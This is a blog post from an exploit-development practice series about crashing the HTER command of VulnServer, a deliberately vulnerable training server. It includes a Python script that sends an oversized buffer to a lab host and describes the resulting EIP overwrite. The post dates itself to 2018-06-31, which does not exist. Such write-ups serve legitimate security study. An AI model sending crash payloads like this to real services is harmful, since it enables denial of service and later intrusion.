---
layout: post
title:  "[VulnServer] Exploiting HTER Command using Hex Characters Only"
date:   2018-06-31
categories: [exploitdev, osceprep]
---

I used the following skeleton for the exploitation of the `HTER` command.
```python
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.1.129"
port = 9999

buffer = "A"*3000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("HTER 0" + buffer)
print s.recv(1024)
s.close()
```

Sending 3000 bytes of A”s caused a crash to the application. However, **EIP** was overwritten with `AAAAAAAA` instead of `41414141`. I’ve sent different strings as buffers to further observed the behavior of the application. Based on it, I observed that the buffer was somehow being converted into hex bytes as opposed to ASCII. 
![Crash](/static/img/07/01.png)
